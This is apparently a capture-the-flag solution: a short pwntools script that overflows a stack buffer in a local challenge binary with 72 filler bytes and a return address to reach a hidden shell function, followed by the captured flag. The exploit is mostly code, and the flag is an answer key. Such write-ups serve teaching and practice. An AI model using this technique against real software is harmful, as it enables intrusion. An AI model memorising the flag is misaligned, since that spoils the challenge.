# Call to a hidden function using stack overflow

```python
from pwn import *

context.arch = 'amd64'

p = process('./hidden_shell')
# remote('chall', 1337)

# gdb.attach(p, '''break vulnerable''')

p.sendline(b'A'*72 + p64(0x00000000004011be))

p.interactive()
```

Flag: `vgucypher{st@ck_0verf0w_t0_rc3}`